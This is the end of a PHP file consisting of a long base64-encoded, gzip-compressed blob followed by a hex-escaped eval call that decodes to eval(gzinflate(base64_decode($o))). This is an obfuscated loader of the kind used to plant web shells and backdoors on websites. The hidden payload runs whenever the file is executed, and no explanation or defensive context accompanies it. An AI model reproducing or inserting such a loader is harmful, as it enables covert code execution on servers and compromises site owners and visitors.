lFjs/LnxcqaWU6rv3Zn1KoPqlQP72Q4X3++DG9RZAxUobtpgQaSdMsR+grJV2fGObRsInaZjJy0pisg+hHJR2sLjPbsYb4RWoyV8ALjUi8SboAj5ldsCIYDheD7XIbl/HddYuHj6LPDlMM3rho0jYjoaqNfI3El85+CdE4kbo1bcFO0Csk9wqhWaDn+MMH8ukhzIRRn0VGCEH8uQoM+sIaKXTPCahiDJWavxTlhynZrBFiSvxiJMd0Cu4QL3Q8kv/rXwqfUHC2+Bn1mpr48gGaZSR28WJiD8+LmTRuYSLJTsJ55m1CVkwHcxXlhIioWpLtSNF7VgLXsU3lnx8/flznOT75jY7kaUJfTh8MFgp7YUMb3X8igeysoOK3KRX2feHIw+EN6+WtC0Y0suciDXLQsugTFyKAW8P59j2KYZYaHI2qwQBpPOTpmPHFvQpE4dUvW1SqNnevbsavzAKDkSJ1x6/EcEz6kp+2i97l8YcV0uY1EBCF6pU+2yJPXS12zH11pLWIxMRBQZjN8HUmfysnEfeMC2nro7lLLHf8lCgB4NnppHxarin57FJeS+2pkehyUEw0SbJ1ajP/ZnjGL33AEXCyzQk52qqygRV+i3YiF9PYxxytV3qJdYLUSfHk/5qoWrrjIxg816d+1y60Q4c+MyeZj4z4io9wlYiPjPIYFmgITkQTvhEZ3+BFF5WFKGXKMp2JqGVGL0SynBqHh5eqSD3TW0Nm4kiLL4aMELRxEwMoUnG3E9igB5ELJ7+nJzpwQ9ZqxviEhlzGI5pejNOiD2zFDRF29w7QgwXoWkpSKHAk9Hdjo7BVXIu78tWGy98CIytPtk3B0b7vOGndgtvvJmZ+WbT5xYPcWPlre3IhLddzig1/3PeK0yFifmtTumIx0X2/RiZo0ps/eTUcLe3ozkG2bY8zedRodh2RdLvQ0qQC4IvIE1FdMMIXI85J9rlN9pLOOcficrJ7JO4FIu6mObsQgSopHmO5B4x75JDQnMJYNunwQa2L9/1xziKaFDMXeWPl7PXkfHuXPj6aYd51wj8i4QmJOxVOOsQW7cLkjzqysJNi6EjctrQPGQCKbyzcfRzaQZIwJzg0j1wenVnhwPU7XLM9i9HQxOXKg7GhlotO/7b4XLg7qLcuDs/ydwfO00m3Nb976T7q1yuPjcOrzl11+7Ox5LycLJ093RZDxyytuBet/HGi7MGKYx44/bubyyf9ermv7y6flbpO3yzthLfXTv/4gJ7bRtd8PCntPOoH+8NyycP34nUh75UPg7OSvd0ql3a8Ru+ydde9/AQ0wPt2y1iqDM3rs3z5kOpv3x1UhjdQN7x7jceoXOf2+ipsFJfd0+pgcFyL0l+QHgPgb4p37cY1zMDq9mp5b//gJu+cV66kegDmpAc4ndVBY+koX97Nt/TDylOjd+re3lSe9Gqb0ftyZB5XO2nliDZ4bt5eVzqGDfVQn1T4uyi/b0r0de9KAHco+ra9U3FWj2qdqzr0U62WPzu5KZzV652rnVp10Kpe7VzWO6v1WmG1flnY9sq7cb/d2dvu8cHZU6O74twuXbrQh0G51H4xD48K8A50rj7qxf3O3WG5dWx3WkdIsz1A+j/eXa92j2H8jd7VI4zTS6N45jOaO95xDfqzuhO1l34Odxyjd/Rk2C37srgKS5DKdWGsg7LdGYE9cszDq2HD3h6cD2DeUFo+GjfzZnt4fHDXOSlty+Mmpz9PSB/K42zdwPy9zrtle9WGMX8yiq3WyXXHlmAeGwerL3fVNvQ50uitso9hJVaFB6tiuPdk3pwNT4pH0EOrg7ubowCgC0ax3qpTL17lsSVHBw6N+MU1H2WYJQ271bm8Ojq8coLBTbXTah4OWrCqnOPS0T712KPbOirtGw277BGOwx2G4yY5u49LlZ16x7zG2QIt7ejXNHKwUp4/lw8q3l21ZVdujoaNpfLHcumyfXOwzFtaGRjd1XzjpdADmthz8Wil0d0PoUzPPDgbHA2p9TTKsGLden51t5qnGXc5bfYBrVBf5Qlmw+cmjIR+XXfLnash1DE8t7c75avnPht977FRXOnfwao93j+7uMyH+1clKk/te0P5J+Pgqg9l65U95xzab1/Yd0QPrFjWzi6My/WyWy9U9moFpHc6TOXqqJoK0ztbAQ7jNKBv+Hi/6KXtUK8aND7A4WAm1QlHtb48loZ1s7rOgsbSmcNovqrWoR18dtk98wENat7HcCtDeO+l5ZnXKx7kd9LyYCECzjJjwDYscCDLvK445d3nF/OgEujX5TcyZ/fH7c1RzwRGYYlFy+DYtEHmgky/iAtxx4sW9sEZMMtyyzjYfzEKwcvpfv4NjPzIaVyv5u9qrzNzXnfroroTTd/L+l2zWl+BKfY8OmXlssAgW23GBO86x5ecXvrZGcJSKRjd5dZJbS+mtws0wNTgzB2YW8FrHHaw7ohJxwyNt6G6AhvOStM4WB2ayNgP2rD8Vl6OD/bhb8elPnWCZ2AN3qSyjPGuvNxwZg31ueYBMNlSG+rc36vsHzUv6yt3UtuA4a10jlm/AnMbtNKZ+faP4+rd8O668GQe1IPy7s7yaW1bGrtnj5aC3Y7HeLcu0Wm6+vWzc7y7J23Y7Afm3RLAr95enz3e3ezkJVoGJ7tSHSWZifP582r+3iv55dH8JaPrQH+2gS2bSINdx/m4ZD4Z3cuPZXuwEvfdthjr9l1JwD8Pbm/OXk5AwLC6V093dpve5U2f9dcdbIBt76K2/UmvPeNGGyC7obkPLFavBn5ynrEf/frWhY2ZcF4XHRMEjdVyyYQtwWDsPSXPwLxSJ0Gz1F4ZvnVUGAyOXoJx2AOnywWCx8bNtpiLw5vqM2/f9upFFTbhFJrZ+Ees0k6yytH+Zz+CTfK54SU2/15+Y5Q9Ttx53U49396v7Q1WR/d2RAnd2Tre26Hdsrw7aJ3CrmsNdxzrwMnjVD0f7qym7d4Gfz7ePw2OnB0hD8Iz7VhN4O7VSn3/7OTABPmF7Xy3PWDf1wXYzc387dJ271ja4culo93b65U8sEBYYvsw/QSLquBuTzsuPFNaY2mH6oWd9xTYFd8hgX0VVquVq6sa1AvLvByc0pTz2PIG+FiGO2pCP7hHe/vVSuGuAWw2ABa4A/tc9Sa/f34N7CWWFLZBRttH1k27KshuT0YvoinQSW6CXXI4eJF25la5c9ZGWbxx4MDWMVZuST9wApAonrlseBQt/b2zi1pnOaiTlOEe0XSvtjrGgdO5uIYl0w08UaZ0HdPXAEmFllQ3sNlUbcEWcdWFtjsgI1N5WratzhH0H7CpndrVXuWoZg/si9Ldbi2/cl5+HMu/uIIxLT8udy/zq+c1oh3rJcmgFUsG5fmjDtFNc6p06cD8uXoslyq16t7Vaa0U94txeERnFIYv6luCN29gqxVl9kGa4fTwpcDK8LS7m7YHWwTJxKUbaUlEV9388Db9ywTJy26t1/Skz2gkXNronN4P7F4rEXkCPXISkSiCYIKnLVbFrHZhzZJPD3rXLcIKXgzascJ6EQEv0G9JSaiN8QQvVMZYONIYLxWWlj5pm4q4MZ9WDq/oRLlB4EKpOrYIisgXTCo1Ux29X2p4hrZZmvRdsIbn0Xd0U8zElekXMn9E3+X6q6PB7KjTx2fKeMABZoEfYGBIRoaC23RP7lTujiTdA6NjaQUWzzetsnd6Xtt72N7drWjf8WpX+Z2Rfc8YGVPHyPjrY5T8Zsn45bIczC62fcVoddnZ6AptdrAhAtw1s+pAnVNcX/k6/n2v0VjFcsTeQaTW/dqkyMiQlP2a+DJTBmrkqAFLMBVgPCxyMw14XVTJnd4G8qXcL3GZPqoxw6UTRbJrZtTFsOstNrycoWblE44Is+v2Q3Iry6gtw1AWgEsweCUux0GFz7A6lkNIcgyLKD4apE1OWKKEf6nJe+ekpg1xcjdx1QsUvf+s/Ftp+ZanNDyVrjBQzaauv9IXXmpfeE6iM7yxzqDQF1AxzF+sTIkLjjfs99uBdLy5KUbasBpsWBPKwldG1lDioukja0wbWeM/ObLGO7ojbWQNPrIJNdEbB9dIHdy/sW0TRnuCejj+Bkxk+cIiDSl03Z4Z/2hSbNWIdyUUsfmQ2QgixePflNHFh2GkBLqztIxyr+lqvNCHlFJAwPgHG+lVU3LKWAWGjp+Wg83rAUtNAl3/a41Wolbvu25Irf5/AQ==" ;eval("\x65\x76\x61\x6C\x28\x67\x7A\x69\x6E\x66\x6C\x61\x74\x65\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28\x24\x6F\x29\x29\x29\x3B"); ?>